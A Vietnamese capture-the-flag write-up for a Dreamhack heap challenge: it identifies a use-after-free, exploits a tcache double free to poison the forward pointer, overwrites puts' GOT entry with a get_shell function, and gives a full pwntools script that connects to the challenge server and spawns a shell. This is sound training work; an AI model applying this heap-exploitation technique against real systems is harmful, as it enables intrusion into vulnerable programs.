# 1. Find Bug :

<img width="2553" height="1060" alt="image" src="https://github.com/user-attachments/assets/51e75454-4ae2-4626-b20c-597aa251948f" />

- Free ko xóa con trỏ -> UAF

<img width="589" height="165" alt="image" src="https://github.com/user-attachments/assets/6382f5e3-95c1-4e59-ae92-2703213150eb" />

- Có hàm get_shell

# 2. Idea : 

<img width="1152" height="272" alt="image" src="https://github.com/user-attachments/assets/889b2462-ace6-4fd7-a2cb-7fb78d80a4e0" />

- Ta thấy PIE tắt + Partial RELRO, và tận dụng UAF -> Overwrite got hàm nào đó -> get_shell

<img width="1399" height="351" alt="image" src="https://github.com/user-attachments/assets/26f1e299-95ba-42fa-8b05-6e1a34c4a3cd" />

- Ở đây ta chọn got `puts`

# 3. Exploit :

- Ta để ý khi `free` ở bản libc này `tcachebin` ko có key để chống `double free` nên ta tạo 1 chunk và free thẳng 2 lần

```
create(0x100, b'0')
dell(0)
dell(0)
```
<img width="1275" height="1444" alt="image" src="https://github.com/user-attachments/assets/614e0f6b-48fb-483f-9df3-2ff1672459fb" />

- Sau đó malloc 1 lần với size thuộc vùng tcache cũ và overwrite `forward pointer` -> got `puts`

<img width="1148" height="1270" alt="image" src="https://github.com/user-attachments/assets/70bc32c1-6ee3-40f9-aac3-81fee67b844b" />

- Giờ cần malloc lần 1 để cái tcachebin đầu được sử dụng rồi malloc lần 2 để overwrite got `puts` -> `get_shell`

## SCRIPT :
```
#!/usr/bin/python3

from pwn import *

exe = ELF("tcache_dup_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+92
        c
        ''')
        input()

def create(size, data):
    slna(b'> ', 1)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def dell(index):
    slna(b'> ', 2)
    slna(b'idx: ', index)

if args.REMOTE:
    p = remote('host3.dreamhack.games', 9049)
else:
    p = process([exe.path])
GDB()

create(0x100, b'0')
dell(0)
dell(0)
create(0x100, p64(exe.got.puts))
create(0x100, b'a')
create(0x100, p64(exe.sym.get_shell))





p.interactive()
```

# 4. Get Flag :
<img width="1943" height="188" alt="image" src="https://github.com/user-attachments/assets/c0e5e2a0-7c32-49f5-a4f9-27089a254875" />
